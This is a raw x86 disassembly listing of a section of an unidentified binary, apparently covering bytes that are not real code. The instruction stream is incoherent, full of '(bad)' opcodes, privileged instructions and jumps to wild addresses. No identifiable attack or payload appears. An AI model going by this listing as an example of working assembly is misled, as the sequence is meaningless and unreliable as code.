  424bc8:	fist   DWORD PTR [ebp+esi*2-0x3]
  424bcc:	pop    ebx
  424bcd:	push   edi
  424bce:	inc    edx
  424bcf:	xor    al,bl
  424bd1:	sbb    eax,0xeba4e55
  424bd6:	sbb    cl,BYTE PTR [edi-0x4a]
  424bd9:	shr    DWORD PTR [edi+0x2c],cl
  424bdc:	imul   ebx,DWORD PTR [ebp-0x20],0xc8ff2dd0
  424be3:	cmc    
  424be4:	sahf   
  424be5:	sub    ah,al
  424be7:	xor    BYTE PTR ds:0x6a1269b5,ch
  424bed:	and    eax,0x88260441
  424bf2:	aaa    
  424bf3:	cli    
  424bf4:	xchg   BYTE PTR [esi-0x60],bl
  424bf7:	and    DWORD PTR [ebp+0x62a227a6],0x9ac6b0e6
  424c01:	popa   
  424c02:	fdivr  DWORD PTR [esi+0x73d0469f]
  424c08:	into   
  424c09:	sar    BYTE PTR [esi-0x17],1
  424c0c:	push   ebp
  424c0d:	fild   DWORD PTR ds:0xfff941d2
  424c13:	pop    es
  424c14:	jp     0x424c76
  424c16:	loope  0x424c4d
  424c18:	imul   BYTE PTR [esi+0x43]
  424c1b:	inc    edi
  424c1c:	imul   edx,ebp,0x57d28ecc
  424c22:	test   al,0xe
  424c24:	retf   0xfc86
  424c27:	mul    BYTE PTR [esi]
  424c29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c2a:	push   esp
  424c2b:	dec    ecx
  424c2c:	push   esi
  424c2d:	or     al,0xcd
  424c2f:	(bad)  
  424c30:	sub    bl,dl
  424c32:	imul   ebx,DWORD PTR [ecx],0x7e
  424c35:	mov    eax,ds:0x89fd3068
  424c3a:	xor    BYTE PTR [ebx-0x1],dh
  424c3d:	loopne 0x424c1f
  424c3f:	pop    ebx
  424c40:	iret   
  424c41:	push   edi
  424c42:	retf   
  424c43:	jmp    0x424c70
  424c45:	add    bh,bh
  424c47:	adc    dh,dh
  424c49:	gs (bad) 
  424c4b:	(bad)  
  424c4c:	inc    esp
  424c4e:	push   ds
  424c4f:	push   ebx
  424c50:	loop   0x424be0
  424c52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c53:	xor    eax,0x25
  424c56:	adc    eax,0x68e7b7d5
  424c5b:	in     al,dx
  424c5c:	inc    ebx
  424c5d:	dec    esi
  424c5e:	popf   
  424c5f:	and    edi,DWORD PTR [ebx+edi*2]
  424c62:	jp     0x424bf2
  424c64:	mov    eax,ds:0x542320b8
  424c69:	repz int 0xac
  424c6c:	test   DWORD PTR [ebx],eax
  424c6e:	outs   dx,DWORD PTR cs:[esi]
  424c70:	aaa    
  424c71:	jl     0x424c08
  424c73:	loopne 0x424cbc
  424c75:	mul    DWORD PTR [edx]
  424c77:	add    BYTE PTR [esi],ch
  424c79:	aas    
  424c7a:	aam    0x15
  424c7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c7d:	ret    0x4084
  424c80:	or     BYTE PTR [ebx-0x15a2d761],ch
  424c86:	mov    bl,0x7f
  424c88:	cld    
  424c89:	jno    0x424c7c
  424c8b:	mov    bl,0xf7
  424c8d:	push   es
  424c8e:	pushf  
  424c8f:	jg     0x424cab
  424c91:	adc    dl,BYTE PTR [esi+0x36]
  424c94:	mov    ebx,eax
  424c96:	fdiv   DWORD PTR [ebx]
  424c98:	retf   
  424c99:	or     eax,0x58925de8
  424c9e:	jne    0x424c67
  424ca0:	stc    
  424ca1:	daa    
  424ca2:	mov    esp,0x14d99319
  424ca7:	xor    BYTE PTR [esi-0xe],dh
  424caa:	xchg   esi,eax
  424cab:	(bad)  
  424cac:	sbb    DWORD PTR [ecx-0x45],ebx
  424caf:	in     al,0x98
  424cb1:	xchg   ebx,eax
  424cb2:	retf   
  424cb3:	pop    ecx
  424cb4:	dec    ebx
  424cb5:	jb     0x424ca2
  424cb7:	push   ss
  424cb8:	cdq    
  424cb9:	xor    eax,0x683c22e
  424cbe:	loop   0x424ca9
  424cc0:	sar    DWORD PTR [edx+0x4ff9612e],1
  424cc6:	scas   al,BYTE PTR es:[edi]
  424cc7:	int3   
  424cc8:	int    0x9
  424cca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ccb:	(bad)  
  424ccc:	mov    al,ds:0xa51f45f
  424cd1:	(bad)  
  424cd2:	in     al,dx
  424cd3:	add    al,0x2
  424cd5:	inc    edi
  424cd6:	rcr    BYTE PTR [eax+0x4],cl
  424cd9:	cli    
  424cda:	imul   DWORD PTR [eax+ebx*4+0xebf4481]
  424ce1:	xor    BYTE PTR [eax+esi*2],ch
  424ce4:	daa    
  424ce5:	stos   BYTE PTR es:[edi],al
  424ce6:	js     0x424c9d
  424ce8:	aaa    
  424ce9:	or     eax,0x5e51f882
  424cee:	dec    ebx
  424cef:	adc    edx,DWORD PTR [esi]
  424cf1:	dec    ecx
  424cf2:	ret    
  424cf3:	jecxz  0x424cd9
  424cf5:	inc    ebx
  424cf6:	dec    ecx
  424cf7:	(bad)  
  424cf8:	pushf  
  424cf9:	xlat   BYTE PTR ds:[ebx]
  424cfa:	pop    esp
  424cfb:	leave  
  424cfc:	clc    
  424cfd:	mov    ds:0xbff2e948,eax
  424d02:	mov    ebp,0x99e4f06b
  424d07:	cdq    
  424d08:	loop   0x424cd4
  424d0a:	sbb    dh,ch
  424d0c:	or     DWORD PTR [edx],ecx
  424d0e:	and    DWORD PTR [edi-0x30],eax
  424d11:	das    
  424d12:	retf   
  424d13:	sub    eax,0x93a3bc8d
  424d18:	or     eax,DWORD PTR [ebp+0x79]
  424d1b:	inc    edx
  424d1c:	js     0x424d6c
  424d1e:	push   edx
  424d1f:	(bad)  
  424d20:	fld    QWORD PTR [edi-0x69]
  424d23:	mov    al,ds:0x3ecdf319
  424d28:	jae    0x424d5a
  424d2a:	inc    esi
  424d2b:	xor    esp,ecx
  424d2d:	(bad)  
  424d2e:	ror    BYTE PTR [ecx+0x6a6a5860],cl
  424d34:	std    
  424d35:	retf   0x7655
  424d38:	aad    0x1f
  424d3a:	sub    al,bh
  424d3c:	cmp    eax,0x74bcedb1
  424d41:	mov    es,WORD PTR [ebp+0x592e4c24]
  424d47:	add    BYTE PTR [ebx-0x7e4a9245],ah
  424d4d:	lea    esp,[eax+edi*2-0x2e9ad823]
  424d54:	jmp    DWORD PTR [ecx]
  424d56:	and    edi,ebx
  424d58:	test   BYTE PTR [eax+ebp*8+0x76],ch
  424d5c:	pop    ebx
  424d5d:	sbb    DWORD PTR [eax+0x40],ebp
  424d60:	mov    cl,0x24
  424d62:	jge    0x424dc8
  424d64:	mov    edi,0x5423364d
  424d69:	outs   dx,BYTE PTR ds:[esi]
  424d6a:	jle    0x424d6e
  424d6c:	test   DWORD PTR [eax],0xb3767d57
  424d72:	in     eax,dx
  424d73:	inc    esi
  424d74:	sub    edi,esp
  424d76:	push   esp
  424d77:	mov    bl,0x69
  424d79:	mov    esp,0x6a6672ee
  424d7e:	dec    esp
  424d7f:	addr16 aad 0xea
  424d82:	pop    eax
  424d83:	dec    esp
  424d84:	push   edi
  424d85:	push   ds
  424d86:	in     eax,dx
  424d87:	ret    0xc80a
  424d8a:	adc    dh,ch
  424d8c:	loop   0x424d4e
  424d8e:	xor    edi,DWORD PTR [eax+0x3d]
  424d91:	jnp    0x424db0
  424d93:	in     eax,dx
  424d94:	loope  0x424d16
  424d96:	and    ebx,esi
  424d98:	jo     0x424d74
  424d9a:	aad    0x67
  424d9c:	pop    eax
  424d9d:	xchg   ecx,eax
  424d9e:	ror    dl,1
  424da0:	add    eax,0x80290c1
  424da5:	lea    eax,[ebx+0x11e1d84d]
  424dab:	daa    
  424dac:	ja     0x424d90
  424dae:	popf   
  424daf:	jno    0x424dcd
  424db1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424db2:	or     BYTE PTR [ecx+esi*2+0x28],ah
  424db6:	scas   al,BYTE PTR es:[edi]
  424db7:	test   eax,0xe5009865
  424dbc:	in     al,0xd0
  424dbe:	mov    ecx,0xa94dc74a
  424dc3:	sbb    dl,cl
  424dc5:	cmc    
  424dc6:	jae    0x424d51
  424dc8:	or     BYTE PTR [ebx+ebp*1+0x54],dl
  424dcc:	sub    DWORD PTR [esi+0x31a58a45],ebx
  424dd2:	adc    esp,DWORD PTR [eax+ebp*2-0x53]
  424dd6:	mov    esp,0xc9891c5
  424ddb:	xor    esi,ecx
  424ddd:	mov    esi,0x7996cf3e
  424de2:	(bad)  
  424de3:	fs scas eax,DWORD PTR es:[edi]
  424de5:	sbb    dh,bh
  424de7:	int3   
  424de8:	or     cl,0xcd
  424deb:	fsubrp st(2),st
  424ded:	xchg   esp,eax
  424dee:	loopne 0x424dd2
  424df0:	fdivr  QWORD PTR [eax]
  424df2:	aas    
  424df3:	push   ebp
  424df4:	sbb    DWORD PTR [esi+0x4c],0x16d3bcea
  424dfb:	mov    bl,0x0
  424dfd:	mov    dh,0xc7
  424dff:	and    eax,0xffffffba
  424e02:	dec    ebp
  424e03:	lods   al,BYTE PTR ds:[esi]
  424e04:	mov    ch,0xcd
  424e06:	mov    ebx,0xf4a67aa6
  424e0b:	push   es
  424e0c:	add    ah,ch
  424e0e:	sbb    eax,0xc3eca439
  424e13:	mov    ecx,eax
  424e15:	adc    eax,0xb97dff60
  424e1a:	xlat   BYTE PTR ds:[ebx]
  424e1b:	mov    ebx,0xba752280
  424e20:	and    esi,ebp
  424e22:	add    edi,DWORD PTR [edi-0x2d]
  424e25:	push   ecx
  424e26:	mov    ecx,0x28c64a4f
  424e2b:	(bad)  [ebx]
  424e2d:	xchg   esi,eax
  424e2e:	and    eax,0xe03c3f4e
  424e33:	ret    
  424e34:	ficom  DWORD PTR [esp+ebp*8-0x17e6fc1c]
  424e3b:	rcl    BYTE PTR [esi],0x95
  424e3e:	dec    ebp
  424e40:	mov    al,ds:0x299c6663
  424e45:	enter  0x5d35,0x1a
  424e49:	fcom   st(7)
  424e4b:	das    
  424e4c:	mov    ds:0x64c98ee5,al
  424e51:	ret    
  424e52:	inc    ecx
  424e53:	add    eax,0x70610d57
  424e58:	lds    ebx,FWORD PTR [ecx+0xf3a095f]
  424e5e:	mov    eax,ds:0x3b23a6a5
  424e63:	dec    edx
  424e64:	js     0x424e49
  424e66:	leave  
  424e67:	mov    dh,0xb1
  424e69:	mov    ecx,0xfbb852df
  424e6e:	xlat   BYTE PTR ss:[ebx]
  424e70:	or     eax,0xcf349ca2
  424e75:	add    eax,0xe7077c6
  424e7a:	fwait
  424e7b:	jg     0x424e0d
  424e7d:	xor    eax,0xfcdfc8f2
  424e82:	cld    
  424e83:	(bad)  
  424e84:	or     ebp,DWORD PTR [ebp+0x36]
  424e87:	test   DWORD PTR [esi+eiz*4+0x20],ebx
  424e8b:	pop    esi
  424e8c:	sub    BYTE PTR [esi+0x5d],dl
  424e8f:	shl    DWORD PTR [ebx-0x6f],1
  424e92:	loope  0x424e7e
  424e94:	mov    esi,0x96f071fb
  424e99:	stos   DWORD PTR es:[edi],eax
  424e9a:	mov    dl,0xea
  424e9c:	lds    esi,FWORD PTR [ebx+0x6182679e]
  424ea2:	pop    ecx
  424ea3:	xchg   ebp,eax
  424ea4:	shr    bh,1
  424ea6:	fild   WORD PTR [ebx+0x6]
  424ea9:	jl     0x424ec4
  424eab:	cmp    ebx,DWORD PTR [esp+ebp*4+0x12]
  424eaf:	cmp    al,0x1d
  424eb1:	stc    
  424eb2:	xchg   BYTE PTR [edi],dl
  424eb4:	dec    esi
  424eb5:	ds mul edx
  424eb8:	or     ebx,ebp
  424eba:	jne    0x424e64
  424ebc:	xchg   edi,eax
  424ebd:	xor    ecx,ebp
  424ebf:	pop    ds
  424ec0:	in     al,dx
  424ec1:	add    eax,0x8744b48d
  424ec6:	mov    ebx,0xcff85362
  424ecb:	xchg   ebp,eax
  424ecc:	jmp    0x424eb1
  424ece:	ins    DWORD PTR es:[edi],dx
  424ecf:	js     0x424f24
  424ed1:	retf   0xaf0e
  424ed4:	xchg   ecx,eax
  424ed5:	jl     0x424f22
  424ed7:	sti    
  424ed8:	xchg   esi,eax
  424ed9:	dec    eax
  424eda:	jmp    0x2aec85a1
  424edf:	pextrw esp,(bad),0xc5
  424ee1:	mov    eax,ds:0xbb0c24f0
  424ee6:	mov    ah,0x55
  424ee8:	aad    0x21
  424eea:	stc    
  424eeb:	jmp    0x98516b52
  424ef0:	arpl   sp,bx
  424ef2:	jbe    0x424e79
  424ef4:	pop    es
  424ef5:	mov    ds:0xfaf20cd7,al
  424efa:	pop    ds
  424efb:	xchg   esi,eax
  424efc:	test   DWORD PTR [ebp+0x1b3953f1],edx
  424f02:	test   BYTE PTR [ecx-0x648c6b2f],al
  424f08:	mov    ah,0x9f
  424f0a:	(bad)  
  424f0b:	jmp    0xdcc2f9e2
  424f10:	and    edi,DWORD PTR [edi]
  424f12:	push   0xffffffcc
  424f14:	pushf  
  424f15:	inc    edx
  424f16:	sub    al,0x98
  424f18:	das    
  424f19:	fucom  st(1)
  424f1b:	ret    
  424f1c:	arpl   WORD PTR [esi+0x70],bp
  424f1f:	lods   eax,DWORD PTR ds:[esi]
  424f20:	pusha  
  424f21:	mov    dl,0x6d
  424f23:	scas   al,BYTE PTR es:[edi]
  424f24:	jno    0x424f5d
  424f26:	xchg   esi,eax
  424f27:	stos   BYTE PTR es:[edi],al
  424f28:	cli    
  424f29:	gs inc ebp
  424f2b:	xor    al,0x75
  424f2d:	ret    0x454
  424f30:	sahf   
  424f31:	lahf   
  424f32:	in     eax,dx
  424f33:	(bad)  
  424f34:	je     0x424f02
  424f36:	dec    ebx
  424f37:	mov    edx,0xb04eceb5
  424f3c:	and    bl,BYTE PTR [edi]
  424f3e:	pop    ds
  424f3f:	jle    0x424f7e
  424f41:	adc    DWORD PTR [eax-0x51379109],esi
  424f47:	aad    0x94
  424f49:	push   edi
  424f4a:	clc    
  424f4b:	or     eax,0xcc11c186
  424f50:	jp     0x424efb
  424f52:	int    0x4
  424f54:	add    al,BYTE PTR [esi]
  424f56:	loop   0x424f8b
  424f58:	mov    BYTE PTR [ecx+0x46],ch
  424f5b:	or     ebp,eax
  424f5d:	ins    BYTE PTR es:[edi],dx
  424f5e:	mov    ebp,0xea28765b
  424f63:	mov    ch,0x71
  424f65:	mov    ah,BYTE PTR [ebp+0x4d]
  424f68:	arpl   cx,cx
  424f6a:	in     eax,dx
  424f6b:	pop    es
  424f6c:	sub    al,0xb4
  424f6e:	loop   0x424efa
  424f70:	jecxz  0x424f02
  424f72:	pop    esp
  424f73:	dec    ebx
  424f74:	mov    al,0x56
  424f76:	add    eax,0x35a98b8a
  424f7b:	sub    BYTE PTR [edi-0x5bc26eca],0x9c
  424f82:	push   esp
  424f83:	xor    bl,BYTE PTR [edi-0xd]
  424f86:	or     eax,0xf1281df0
  424f8b:	fs xor eax,0x3963b98c
  424f91:	fisttp WORD PTR [esi+ecx*8]
  424f94:	add    eax,DWORD PTR [ebx+0x198cb442]
  424f9a:	cmp    DWORD PTR ds:[esi+0x57],esi
  424f9e:	pop    DWORD PTR [edx+eax*1+0x1dfa766]
  424fa5:	repnz mov BYTE PTR [edx-0x36],dh
  424fa9:	les    eax,FWORD PTR [ebx]
  424fab:	cmp    ebx,ebp
  424fad:	(bad)  
  424fae:	xchg   edx,eax
  424faf:	fyl2xp1 
  424fb1:	ret    
  424fb2:	stos   DWORD PTR es:[edi],eax
  424fb3:	sbb    BYTE PTR [eax-0x3f],0xe1
  424fb7:	jg     0x424ff8
  424fb9:	adc    BYTE PTR [esi],dl
  424fbb:	cmp    eax,0xb805d6ce
  424fc0:	cmp    edi,DWORD PTR [ebp-0x55]
  424fc3:	mov    dl,0x45
  424fc5:	dec    edx
  424fc6:	push   ebx
  424fc7:	sar    ebp,1
  424fc9:	pop    esp
  424fca:	xchg   ebx,eax
  424fcb:	sbb    dh,bl
  424fcd:	xchg   esp,eax
  424fce:	and    BYTE PTR [ebx+0x20f1404f],dh
  424fd4:	loope  0x42500d
  424fd6:	mov    cs,WORD PTR [ecx-0x9]
  424fd9:	mov    edi,0xfcbeedbe
  424fde:	jbe    0x424fa7
  424fe0:	test   edx,ecx
  424fe2:	rol    BYTE PTR [ebx-0x7c],cl
  424fe5:	idiv   DWORD PTR [edx]
  424fe7:	call   0xd6d7:0xda2fb1e5
  424fee:	xor    eax,0x3c58f55f
  424ff3:	hlt    
  424ff4:	inc    ecx
  424ff5:	cmp    al,0xe4
  424ff7:	loopne 0x424fa1
  424ff9:	push   eax
  424ffa:	and    BYTE PTR [esi+0x11],bh
  424ffd:	or     DWORD PTR [eax],esi
  424fff:	jmp    0x42506e
  425001:	cmp    dl,dl
  425003:	ficomp WORD PTR [ecx-0x67b168e4]
  425009:	pop    esp
  42500a:	lahf   
  42500b:	push   ds
  42500c:	cwde   
  42500d:	(bad)  
  42500e:	jge    0x424ffa
  425010:	pop    edx
  425011:	enter  0xfb50,0x8d
  425015:	pop    ds
  425016:	pop    esi
  425017:	mov    dl,0xe9
  425019:	inc    edx
  42501a:	jbe    0x425034
  42501c:	xchg   ecx,edi
  42501e:	out    0xcc,al
  425020:	xchg   ecx,eax
  425021:	sbb    cl,ch
  425023:	jnp    0x424fee
  425025:	inc    DWORD PTR [ebx+edx*2-0x6e804af7]
  42502c:	or     bh,dh
  42502e:	mov    DWORD PTR [ebp+edx*1+0x6a],esp
  425032:	mov    ds:0xb365adee,eax
  425037:	enter  0x873d,0x92
  42503b:	lods   al,BYTE PTR ds:[esi]
  42503c:	xchg   edx,eax
  42503d:	int    0xaa
  42503f:	add    al,0x5c
  425041:	mov    cl,0x86
  425043:	mov    bh,0xd4
  425045:	inc    edx
  425046:	fadd   DWORD PTR [eax-0x56]
  425049:	fsub   DWORD PTR [ebx+0x4e]
  42504c:	push   ebp
  42504d:	dec    ebx
  42504e:	jo     0x425037
  425050:	cmp    al,0xf1
  425052:	push   0x5ead6751
  425057:	out    0xa3,al
  425059:	mov    cl,0x20
  42505b:	repz dec edi
  42505d:	retf   
  42505e:	jae    0x42505e
  425060:	inc    edi
  425061:	(bad)  
  425062:	fsubrp st(7),st
  425064:	pop    ss
  425065:	ins    BYTE PTR es:[edi],dx
  425066:	arpl   bx,bx
  425068:	retf   0x6a43
  42506b:	loope  0x42507a
  42506d:	fcomi  st,st(6)
  42506f:	sbb    DWORD PTR [edi+edi*8],edx
  425072:	lock fdivr DWORD PTR [eax-0x3bf178c8]
  425079:	pop    ecx
  42507a:	scas   eax,DWORD PTR es:[edi]
  42507b:	mov    al,0x8b
  42507d:	dec    BYTE PTR ds:0x3c1a8557
  425083:	sbb    eax,0xa24c461
  425088:	inc    ebx
  425089:	pushf  
  42508a:	mov    DWORD PTR [ecx+0x3242d64a],esi
  425090:	xor    bl,ch
  425092:	das    
  425093:	pop    ds
  425094:	je     0x425056
  425096:	adc    eax,0xae738134
  42509b:	ficom  DWORD PTR [edx+ebx*8+0x2f]
  42509f:	xchg   ecx,eax
  4250a0:	jmp    0xdc01:0x7f09d386
  4250a7:	in     al,0xf1
  4250a9:	sti    
  4250aa:	test   al,0x65
  4250ac:	mov    cl,0xe6
  4250ae:	push   edx
  4250af:	repz fiadd WORD PTR [ebx+0x2f8107b2]
  4250b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4250b7:	xor    bh,0x9e
  4250ba:	mov    dh,0x1
  4250bc:	add    dh,ah
  4250be:	inc    edi
  4250bf:	mov    esi,0xd4f6b147
  4250c4:	xchg   ebp,eax
  4250c5:	out    0xdc,eax
  4250c7:	jmp    0xa3810253
  4250cc:	mov    ch,BYTE PTR ds:0x99420141
  4250d2:	or     bh,cl
  4250d4:	add    BYTE PTR [ebx+0x7876ee2e],dh
  4250da:	(bad)  
  4250db:	dec    edi
  4250dc:	jmp    0x4250e7
  4250de:	loop   0x425079
  4250e0:	dec    esp
  4250e1:	mov    edi,0x86a832a7
  4250e6:	pop    eax
  4250e7:	push   ss
  4250e8:	cwde   
  4250e9:	sbb    eax,0xacd8a5fe
  4250ee:	pop    ds
  4250ef:	inc    ebx
  4250f0:	sbb    eax,DWORD PTR [eax]
  4250f2:	mov    cs:0x47699579,eax
  4250f8:	inc    edx
  4250f9:	iret   
  4250fa:	fdiv   st(4),st
  4250fc:	xchg   edx,eax
  4250fd:	mov    esi,0x2ef29642
	...
  42510a:	pop    ecx
  42510b:	push   ebp
  42510c:	push   esp
  42510d:	push   edx
  42510e:	pop    esp
  42510f:	push   ebx
  425110:	pop    edi
  425111:	pop    edi
  425112:	xchg   ebx,eax
  425113:	stos   DWORD PTR es:[edi],eax
  425114:	mov    ebx,0xdc8ff096
  425119:	not    al
  42511b:	fiadd  WORD PTR [ecx]
  42511d:	add    BYTE PTR [eax+0xb000006],al
  425123:	int    0x56
  425125:	xor    BYTE PTR [edx-0x2],cl
  425128:	push   es
  425129:	sub    al,BYTE PTR [ebx-0x440cd2d3]
  42512f:	mov    bl,0x98
  425131:	push   esp
  425132:	push   ecx
  425133:	xchg   DWORD PTR [edi],edi
  425135:	sbb    edi,edi
  425137:	aam    0x7b
  425139:	push   0xa7b4c8df
  42513e:	jmp    0x6346:0x6d6560c4
  425145:	pop    ds
  425146:	cmp    ch,BYTE PTR [edi-0x4c16caa2]
  42514c:	sti    
  42514d:	jge    0x42512d
  42514f:	repnz mov eax,0x76bdf8b3
  425155:	outs   dx,DWORD PTR ds:[esi]
  425156:	mov    al,ds:0xf7e8035e
  42515b:	outs   dx,DWORD PTR ds:[esi]
  42515c:	js     0x425148
  42515e:	push   edx
  42515f:	mov    ds:0x5eb55c64,al
  425164:	int    0x1b
  425166:	adc    BYTE PTR [edi+0x2cc8f9e2],0x1d
  42516d:	jge    0x425144
  42516f:	sub    DWORD PTR [ebp+0x3b0977a],ebx
  425175:	cs retf 
  425177:	mov    dh,0x9a
  425179:	inc    esp
  42517a:	push   esi
  42517b:	fcom   DWORD PTR [eax-0x1d]
  42517e:	dec    esp
  42517f:	lahf   
  425180:	mov    edx,esi
  425182:	cwde   
  425183:	and    BYTE PTR [edi+eiz*4+0x7f],bl
  425187:	add    ebp,esi
  425189:	stos   BYTE PTR es:[edi],al
  42518a:	xchg   ch,dh
  42518c:	or     al,BYTE PTR [ebx-0x60d629c6]
  425192:	mov    esp,0x5cee751c
  425197:	inc    ecx
  425198:	sbb    eax,0x9a696125
  42519d:	jmp    0x42514a
  42519f:	test   DWORD PTR [edi-0x3ac7dda9],ecx
  4251a5:	outs   dx,BYTE PTR es:[esi]
  4251a7:	ins    BYTE PTR es:[edi],dx
  4251a8:	dec    ebp
  4251a9:	sub    DWORD PTR [eax-0x4f],ebp
  4251ac:	ins    DWORD PTR es:[edi],dx
  4251ad:	mov    ch,0x83
  4251af:	and    DWORD PTR [eax+0x5b9927ea],eax
  4251b5:	mov    eax,ds:0xecb632ec
  4251ba:	pop    esp
  4251bb:	popf   
  4251bc:	lods   eax,DWORD PTR ds:[esi]
  4251bd:	retf   
  4251be:	sbb    dh,ch
  4251c0:	inc    esi
  4251c1:	add    ebp,DWORD PTR [ebx-0x33]
  4251c4:	pop    esi
  4251c5:	push   ebp
  4251c6:	imul   ebx,DWORD PTR [edi+0x669f4c67],0x1e
  4251cd:	or     eax,0x3cb96607
  4251d2:	mov    ds:0x42805ef6,al
  4251d7:	push   edx
  4251d8:	xor    DWORD PTR [esi+0x6f44ad3c],0x9f7028db
  4251e2:	cmp    eax,0x59fbd31d
  4251e7:	test   BYTE PTR ds:0x1eaa9dad,dh
  4251ed:	cmp    eax,0xe3d04489
  4251f2:	outs   dx,BYTE PTR ds:[esi]
  4251f3:	adc    DWORD PTR [esi-0x7f],ecx
  4251f6:	adc    DWORD PTR [ebp-0x43],ecx
  4251f9:	inc    edx
  4251fa:	shl    BYTE PTR [ecx-0x7f],1
  4251fd:	fldcw  WORD PTR [eax+0x321ea719]
  425203:	lds    edi,FWORD PTR [eax]
  425205:	push   ecx
  425206:	mov    eax,0xc126bbf1
  42520b:	lahf   
  42520c:	into   
  42520d:	xchg   DWORD PTR [ebx-0x36fb32ad],ebx
  425213:	inc    ebp
  425214:	int    0xce
  425216:	je     0x4251d9
  425218:	sub    BYTE PTR fs:[esi+0x2bf44628],0xf9
  425220:	push   esi
  425221:	sub    DWORD PTR [edi],0x7a7ec454
  425227:	in     eax,0x7a
  425229:	icebp  
  42522a:	fsub   QWORD PTR [ebx+0x70817d9a]
  425230:	fidiv  WORD PTR [edx-0x6a]
  425233:	and    esi,DWORD PTR [esi-0x41]
  425236:	mov    ah,BYTE PTR [ebx]
  425238:	cli    
  425239:	jb     0x42529c
  42523b:	mov    cl,0x64
  42523d:	stos   BYTE PTR es:[edi],al
  42523e:	leave  
  42523f:	mov    bl,0x49
  425241:	clc    
  425242:	jmp    0x42520e
  425244:	mov    esi,0x5cc7f7df
  425249:	mov    esp,DWORD PTR [ebx+0x76]
  42524c:	ins    DWORD PTR es:[edi],dx
  42524d:	add    esi,DWORD PTR [ebp-0xc0cfa2c]
  425253:	xchg   esp,eax
  425254:	clc    
  425255:	push   0xffffffbb
  425257:	mov    ?,WORD PTR [ecx]
  425259:	mov    ch,0xc9
  42525b:	fmulp  st(1),st
  42525d:	cld    
  42525e:	or     BYTE PTR [esi+edx*4+0x14],al
  425262:	mov    esp,0x67448bd7
  425267:	js     0x4252b2
  425269:	(bad)  
  42526a:	mov    ebp,ebp
  42526c:	xchg   edx,eax
  42526d:	cmp    ah,BYTE PTR [edx+ebx*8+0x14]
  425271:	xchg   esi,eax
  425272:	stc    
  425273:	imul   edx,DWORD PTR [ebp-0x3],0xc
  425277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425278:	xor    DWORD PTR [ebp-0x73],ebp
  42527b:	adc    BYTE PTR [eax],dl
  42527d:	sti    
  42527e:	mov    ds:0xbefc4efe,eax
  425283:	jmp    ecx
  425285:	lock stc 
  425287:	hlt    
  425288:	ins    DWORD PTR es:[edi],dx
  425289:	inc    eax
  42528a:	cmp    ch,ch
  42528c:	sub    bl,bh
  42528e:	fwait
  42528f:	cmp    bh,ch
  425291:	mov    ah,0x99
  425293:	stos   BYTE PTR es:[edi],al
  425294:	nop
  425295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425296:	jl     0x42524b
  425298:	sbb    al,0x40
  42529a:	js     0x425234
  42529c:	jne    0x42529c
  42529e:	sbb    eax,0x6b35502b
  4252a3:	jle    0x42525f
  4252a5:	int3   
  4252a6:	out    dx,al
  4252a7:	cmp    DWORD PTR ds:0x1359a6f7,esi
  4252ad:	stos   DWORD PTR es:[edi],eax
  4252ae:	bound  esp,QWORD PTR ds:0x81214247
  4252b4:	push   cs
  4252b5:	imul   esp,DWORD PTR [esi],0x82400afb
  4252bb:	pop    edi
  4252bc:	or     ch,BYTE PTR [ecx+ebp*2]
  4252bf:	add    ebp,DWORD PTR [ecx]
  4252c1:	call   0xc0457352
  4252c6:	ins    BYTE PTR es:[edi],dx
  4252c7:	bound  ebp,QWORD PTR [esi]
  4252c9:	test   eax,0x2d79990c
  4252ce:	xor    BYTE PTR [ebp-0x402ce8cd],dh
  4252d4:	pop    ss
  4252d5:	fisubr DWORD PTR [ecx-0x2a]
  4252d8:	jp     0x425287
  4252da:	stos   DWORD PTR es:[edi],eax
  4252db:	jl     0x425322
  4252dd:	jns    0x4252fc
  4252df:	sbb    cl,dh
  4252e1:	inc    esp
  4252e2:	and    BYTE PTR [edi-0x2cf3a1ab],al
  4252e8:	dec    esi
  4252e9:	fmul   DWORD PTR [eax]
  4252eb:	push   eax
  4252ec:	cmp    eax,0x8c44204f
  4252f1:	lds    edi,FWORD PTR [ecx+0x8]
  4252f4:	sub    esi,DWORD PTR [ebx-0x1d]
  4252f7:	ror    cl,1
  4252f9:	xor    al,0xd6
  4252fb:	sub    BYTE PTR [ebp-0x5b538ee5],dl
  425301:	lahf   
  425302:	pop    ebp
  425303:	dec    ebp
  425304:	stos   DWORD PTR es:[edi],eax
  425305:	adc    eax,0xcaecdd56
  42530a:	xor    cl,ah
  42530c:	gs jmp 0x4252ef
  42530f:	cmp    DWORD PTR [edx+ebx*1],esp
  425312:	enter  0x89f,0xeb
  425316:	pop    ecx
  425317:	in     eax,dx
  425318:	outs   dx,BYTE PTR ds:[esi]
  425319:	pop    esi
  42531a:	(bad)  
  42531b:	int    0xdb
  42531d:	jae    0x4252c0
  42531f:	lods   al,BYTE PTR ds:[esi]
  425320:	ds and ebx,esi
  425323:	push   edi
  425324:	div    DWORD PTR [ebx-0x6e0c0ff3]
  42532a:	out    0xe,eax
  42532c:	std    
  42532d:	rcl    edx,1
  42532f:	push   edx
  425330:	xchg   DWORD PTR [ebp+0x647a4e56],ebp
  425336:	fs popf 
  425338:	jp     0x4252d0
  42533a:	mov    dh,0xd2
  42533c:	sbb    BYTE PTR [ecx+ebx*1+0x47218636],0xf7
  425344:	dec    ebp
  425345:	into   
  425346:	add    DWORD PTR [ebx],ecx
  425348:	add    BYTE PTR [ebp+0x74799a26],al
  42534e:	pop    ds
  42534f:	fimul  WORD PTR [ebx+0x63]
  425352:	ins    BYTE PTR es:[edi],dx
  425353:	cmc    
  425354:	popf   
  425355:	outs   dx,BYTE PTR ds:[esi]
  425356:	mov    WORD PTR [eax],cs
  425358:	scas   eax,DWORD PTR es:[edi]
  425359:	(bad)  
  42535b:	je     0x425317
  42535d:	call   0x8556:0x73aa301d
  425364:	rcr    al,0xb4
  425367:	xchg   BYTE PTR [ebx+0x5a],cl
  42536a:	ret    0x60f5
  42536d:	and    BYTE PTR [ebx-0x426ee931],bh
  425373:	loope  0x42537d
  425375:	jmp    0x42532d
  425377:	in     al,0xb9
  425379:	cld    
  42537a:	pusha  
  42537b:	clc    
  42537c:	jmp    0x1754aaa0
